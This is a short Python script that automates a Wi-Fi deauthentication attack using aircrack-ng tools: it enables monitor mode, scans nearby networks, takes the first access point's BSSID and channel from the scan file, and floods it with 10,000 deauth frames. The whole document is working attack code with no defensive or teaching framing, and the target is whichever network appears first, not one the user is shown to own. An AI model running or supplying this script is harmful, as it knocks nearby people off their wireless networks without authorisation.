from os import system

# Check interface
system("ifconfig")
try:
    # Enable monitor mode
    system("sudo airmon-ng check kill")

    interface = input("Enter your interface(ex: wlan0): ")
    monitor_mode = "airmon-ng start {}".format(interface)
    system(monitor_mode)

    # Find networks
    find_networks = "sudo airodump-ng -w myoutput --output-format csv {}mon".format(interface)
    system(find_networks)

    # Select targets
    output = open("myoutput-01.csv", "r")

    target_list = []

    for i in range(20):
        line = output.readline()
        target_list.append(line.split(","))
    
    system("rm myoutput-01.csv")

    # Attack
    channel = target_list[2][3]
    bssid = target_list[2][0]

    system("airodump-ng --channel {} {}mon".format(channel,interface))
    system("aireplay-ng --deauth 10000 -a {} {}mon".format(bssid,interface))



finally:    

    # Desable monitor mode (finally)
    disable_mon_mode = "sudo airmon-ng stop {}mon".format(interface)
    system(disable_mon_mode)
    system("sudo service network-manager restart")
    

#system("sudo aircrack-ng")